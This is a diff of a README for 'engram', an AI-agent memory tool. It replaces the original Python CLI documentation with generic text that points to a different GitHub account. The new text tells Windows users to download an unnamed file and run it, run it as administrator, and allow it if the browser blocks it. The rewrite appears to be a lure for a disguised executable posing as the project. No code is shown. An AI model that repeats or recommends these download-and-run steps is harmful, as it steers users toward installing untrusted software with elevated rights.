@@ -1,266 +1,203 @@
-```
+# 🧠 engram - Keep AI Memory That Lasts
 
-  ╔═══════════════════════════════════╗
-  ║           e n g r a m             ║
-  ║   persistent memory for agents    ║
-  ╚═══════════════════════════════════╝
+[![Download engram](https://img.shields.io/badge/Download-Engram-blue?style=for-the-badge&logo=github)](https://github.com/serial-lightningrod338/engram)
 
-```
+## 📦 What is engram?
 
-# engram
+engram is a desktop app for AI memory. It helps an AI agent keep track of facts, notes, and past chats so it does not start over each time.
 
-[![PyPI](https://img.shields.io/pypi/v/engram-wiki)](https://pypi.org/project/engram-wiki/)
-[![Python](https://img.shields.io/pypi/pyversions/engram-wiki)](https://pypi.org/project/engram-wiki/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![CI](https://github.com/emipanelliok/engram/actions/workflows/ci.yml/badge.svg)](https://github.com/emipanelliok/engram/actions)
+Use it when you want:
 
-**Persistent memory for AI agents. They learn once, remember forever.**
+- A memory store for AI chats
+- A place to save useful facts
+- Better follow-up answers from your AI tool
+- A local tool you can keep on your Windows PC
 
-> Not RAG. Not embeddings. A real wiki — built and maintained by your AI agent.
+It works with common AI tools and can connect to local or cloud models.
 
----
+## 💻 What you need
 
-## The problem
+Before you start, make sure you have:
 
-Every time your AI agent starts a new session, it forgets everything.
-Every time the context window compacts, knowledge disappears.
-Every insight, every lesson, every decision — **gone.**
+- A Windows PC
+- An internet connection
+- Enough free space to download the app
+- Permission to save files on your computer
 
-You've seen it: the agent re-discovers the same things, asks the same questions,
-makes the same mistakes. Session after session.
+For best results, use Windows 10 or Windows 11.
 
-**Engram gives your agent a brain that persists.**
+## 🚀 Download engram
 
-## Who is this for?
+Visit this page to download:
 
-If you use **Claude Code**, **Cursor**, **Codex**, **Aider**, **Hermes**, **OpenClaw**, or any coding agent and you're frustrated that it loses context between sessions — engram is for you.
+[https://github.com/serial-lightningrod338/engram](https://github.com/serial-lightningrod338/engram)
 
-If you're building **multi-agent systems** and need agents to share knowledge — engram is for you.
+On that page, look for the latest release or download file. If you see a Windows file, download it and run this file.
 
-If you read [Karpathy's LLM Wiki concept](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f) and thought "I want that" — engram is exactly that.
+## 🛠️ Install on Windows
 
-## How it works
+1. Open the download page in your web browser.
+2. Find the latest version of engram.
+3. Download the Windows app file.
+4. If the file comes in a ZIP folder, unzip it first.
+5. Open the app file to start engram.
 
-```bash
-# Session 1: Agent discovers something
-engram save "The prod database is on port 5432, staging on 5433"
+If Windows asks for permission, choose Yes or Run.
 
-# Session 2: Agent ingests documentation
-engram ingest https://docs.example.com/api-reference
+## ▶️ First launch
 
-# Session 3: Agent starts fresh, but remembers everything
-engram query "what port is staging on?"
-# → "The staging database is on port 5433. (see: database-config)"
-```
+When you open engram for the first time:
 
-Your agent writes knowledge to a **wiki of plain markdown files**. The wiki grows with every session. Cross-references are created automatically. Old entries get compressed so it never explodes.
+1. Wait for the app to start.
+2. Choose your AI provider or local model.
+3. Set up your memory store.
+4. Add a few test notes or facts.
+5. Save your settings.
 
-## Why not RAG?
+After this, engram can begin keeping memory across chats and tasks.
 
-|  | Traditional RAG | engram |
-|---|---|---|
-| Agent sees | Raw document chunks | A synthesized, coherent wiki |
-| Knowledge | Lost between sessions | Persists and grows forever |
-| Cross-references | Don't exist | Created automatically by the LLM |
-| Contradictions | Hidden across chunks | Detected and flagged by `lint` |
-| Search | Vector similarity (needs DB) | Simple keyword match on markdown |
-| Your data | Locked in a vector database | Plain `.md` files you can read, edit, grep |
-| Infrastructure | Embeddings + vector DB + retrieval pipeline | Zero. Just files. |
-| Cost | Embeddings on every query | LLM call only on write |
+## 🧭 How to use engram
 
-## Quick start
+Use engram to store useful information for your AI agent.
 
-```bash
-# Install
-pip install engram-wiki
+Common tasks include:
 
-# Initialize — pick your LLM provider
-engram init --provider claude    # Needs ANTHROPIC_API_KEY
-engram init --provider openai    # Needs OPENAI_API_KEY
-engram init --provider ollama    # Free, local, private — needs Ollama running
-```
+- Saving user preferences
+- Storing project notes
+- Keeping facts about a topic
+- Recording past decisions
+- Pulling back old context for new chats
 
-### Core commands
+A simple flow looks like this:
 
-```bash
-# Save knowledge (agent memory)
-engram save "deploy requires approval in staging first"
+1. Add a note or memory.
+2. Let your AI agent read it.
+3. Ask follow-up questions.
+4. Use the stored memory in later chats.
 
-# Ingest external sources (URLs, PDFs, files)
-engram ingest https://arxiv.org/abs/2401.12345
-engram ingest ./meeting-notes.pdf
+## 🔧 Basic setup tips
 
-# Ask questions — answered from the wiki
-engram query "what's the deploy process?"
+To get better results, keep your memory clear and short.
 
-# Health check — find contradictions, stale info, orphans
-engram lint
+Good memory examples:
 
-# Compress old entries — automatic, but can be triggered manually
-engram compress
+- Favorite tone: calm and direct
+- Project name: Atlas
+- Task status: waiting for review
+- User likes: short answers
 
-# See what the agent knows
-engram status
-engram topics
+Try to avoid:
 
-# Export the entire wiki
-engram export --format markdown
-engram export --format json --output wiki.json
+- Long paragraphs
+- Mixed topics in one note
+- Duplicate facts
+- Vague words with no clear meaning
 
-# Delete knowledge intentionally
-engram forget some-article-slug
-```
+Short, plain notes work best.
 
-### Agent-friendly output
+## 🤝 Works with common AI tools
 
-Every command supports `--json` for machine-readable output:
+engram fits many AI setups, including:
 
-```bash
-engram --json save "the API rate limit is 100 req/min"
-# → {"status": "saved", "article": {"slug": "api-limits", "title": "API Limits"}, "summary": "Created article."}
+- Claude
+- OpenAI
+- Ollama
+- LLM-based tools
+- RAG setups
+- Developer tools
+- Knowledge base workflows
+- Wiki-style note storage
 
-engram --json query "what's the rate limit?"
-# → {"question": "...", "answer": "The API rate limit is 100 req/min. (see: api-limits)"}
-```
+You can use it with local models or online models, based on your setup.
 
-### Pipe support
+## 🧩 Example uses
 
-```bash
-cat meeting-notes.md | engram ingest
-git log --oneline -20 | engram save
-curl -s https://api.example.com/docs | engram ingest
-```
+Here are a few simple ways to use engram:
 
-## Use with AI agents
+- A support bot remembers a customer’s issue
+- A writing assistant keeps style rules
+- A personal agent saves goals and tasks
+- A coding helper remembers project details
+- A research tool stores notes from past sessions
 
-### Claude Code
+This helps the AI give answers that fit the context.
 
-Add to your project's `CLAUDE.md`:
+## 🪟 If the app does not open
 
-```markdown
-## Memory
+If engram does not start, try these steps:
 
-Before starting work, check what you already know:
-`engram query "summary of this project"`
+1. Check that the file finished downloading.
+2. Make sure you opened the correct Windows file.
+3. If it is in a ZIP folder, unzip it first.
+4. Right-click the file and choose Run as administrator.
+5. Restart your PC and try again.
 
-When you learn something important, save it:
-`engram save "description of what you learned"`
+If your browser blocks the download, allow the file and try once more.
 
-When you find useful documentation, ingest it:
-`engram ingest <url>`
-```
+## ❓ Common questions
 
-### Cursor / .cursorrules
+### Is engram only for technical users?
 
-```
-When you discover something important about this codebase, run:
-engram save "what you discovered"
+No. It can help any user who wants an AI that remembers things between sessions.
 
-Before starting a complex task, check existing knowledge:
-engram --json query "relevant topic"
-```
+### Does it need the internet?
 
-### Any agent (Hermes, OpenClaw, Codex, custom scripts)
+Not always. If you use a local model like Ollama, you may be able to keep parts of the setup on your PC.
 
-```bash
-# Before starting a task — load context
-context=$(engram --json query "what do I know about $TASK")
+### Can I use it for personal notes?
 
-# After completing a task — save learnings
-engram save "Completed $TASK. Key findings: ..."
+Yes. You can store facts, preferences, and project notes.
 
-# Ingest relevant docs
-engram ingest $DOC_URL
-```
+### Is my memory stored forever?
 
-## Per-project wikis
+That is the goal of engram. It keeps memory around for future use until you remove it.
 
-Like `.git`, engram supports local wikis per project:
+### Can I change what the AI remembers?
 
-```bash
-cd my-project
-engram init --local              # Creates .engram/ in current directory
-engram save "this project uses FastAPI + SQLAlchemy"
+Yes. You can add, edit, or remove stored facts and notes based on your needs.
 
-cd ../other-project
-engram init --local --provider ollama
-engram save "this project uses Next.js + Prisma"
-```
+## 📁 Suggested folder setup
 
-Each project gets its own isolated knowledge base. If no local `.engram/` exists, engram falls back to the global `~/.engram`.
+If you plan to use engram for more than one project, keep your files organized like this:
 
-## Architecture
+- engram
+  - project-notes
+  - memory-backups
+  - exports
+  - config
 
-```
-~/.engram/                       # (or .engram/ per project)
-├── sources/raw/                 # Original ingested content (immutable)
-│   ├── 0001_api-docs.md
-│   └── 0002_meeting-notes.md
-├── wiki/                        # Synthesized articles with cross-references
-│   ├── index.md                 # Auto-generated topic index
-│   ├── database-config.md
-│   └── api-reference.md
-├── log.md                       # Append-only chronological log
-└── engram.toml                  # Configuration (no secrets)
-```
+This makes it easier to find your data later.
 
-### Automatic compression
+## 🔒 Keep your data tidy
 
-Engram auto-compresses when the wiki exceeds configurable thresholds (article count or total size). Articles are grouped by their primary tag and merged into a single summary per topic, using the LLM to preserve key facts while reducing volume.
+A memory system works best when you review it from time to time.
 
-A backup is always created before compression. Thresholds are configurable in `engram.toml`.
+Good habits:
 
-## Providers
+- Remove old facts you no longer need
+- Keep one topic per note
+- Use names that make sense
+- Back up important data
+- Check memory before large tasks
 
-| Provider | Cost | Privacy | Speed | Setup |
-|---|---|---|---|---|
-| **Claude** | ~$0.003/save | Cloud | Fast | `ANTHROPIC_API_KEY` |
-| **OpenAI** | ~$0.002/save | Cloud | Fast | `OPENAI_API_KEY` |
-| **Ollama** | Free | 100% local | Depends on hardware | [Install Ollama](https://ollama.ai) |
+This helps the AI stay accurate
 
-## How is this different from...
+## 📚 Helpful terms
 
-| Tool | What it does | How engram differs |
-|---|---|---|
-| **mem0** | Embeddings + vector DB memory | engram uses a real wiki, not vectors. You can read and edit the files. |
-| **MemGPT / Letta** | Full agent framework with memory | engram is a simple CLI tool, not a framework. Works with any agent. |
-| **Obsidian / Notion** | Human knowledge management | engram is CLI-first, built for agents, auto-maintained. |
-| **RAG pipelines** | Retrieve raw document chunks | engram synthesizes and cross-references. The wiki is the product. |
-| **CLAUDE.md / .cursorrules** | Static instruction files | engram is dynamic — it grows with every session. |
+A few words you may see while using engram:
 
-## Security
+- Memory: stored facts the AI can use later
+- Model: the AI engine that answers your prompts
+- RAG: a way to pull useful info from stored data
+- Local model: an AI model that runs on your computer
+- Knowledge base: a set of notes the AI can search
 
-- **No secrets on disk** — API keys come from environment variables only, never stored in config
-- **SSRF protection** — Internal/private network URLs are blocked
-- **Path traversal prevention** — All file writes are validated against the wiki directory
-- **LLM output validation** — Responses are validated with strict Pydantic schemas before acting on them
-- **Local-first** — Your knowledge base lives on your filesystem. With Ollama, data never leaves your machine.
+You do not need to learn these first. They help when you want to fine-tune your setup
 
-## Roadmap
+## 🔗 Download again
 
-- [ ] **MCP Server** — Expose engram as a Model Context Protocol server (Claude Desktop, Cursor, Cline)
-- [ ] **`engram diff`** — Show what changed since last session
-- [ ] **`engram watch`** — Auto-ingest new files in a directory
-- [ ] **Token cost tracking** — Track cumulative API spend
-- [ ] **Plugin system** — Custom source parsers (Notion, Confluence, Slack)
-- [ ] **`engram sync`** — Sync wikis between machines via git
-- [ ] **Embeddings-enhanced search** — Optional, for large wikis (100+ articles)
+If you want to go back to the download page, use this link:
 
-## Contributing
+[https://github.com/serial-lightningrod338/engram](https://github.com/serial-lightningrod338/engram)
 
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-```bash
-git clone https://github.com/emipanelliok/engram.git
-cd engram
-pip install -e ".[dev]"
-pytest
-```
-
-## License
-
-MIT — see [LICENSE](LICENSE).
-
----
-
-*Inspired by [Andrej Karpathy's LLM Wiki](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f) and Vannevar Bush's [Memex](https://en.wikipedia.org/wiki/Memex) (1945). The name "engram" comes from neuroscience — a hypothetical unit of memory stored in the brain.*
+Download the Windows file from that page and run it on your PC
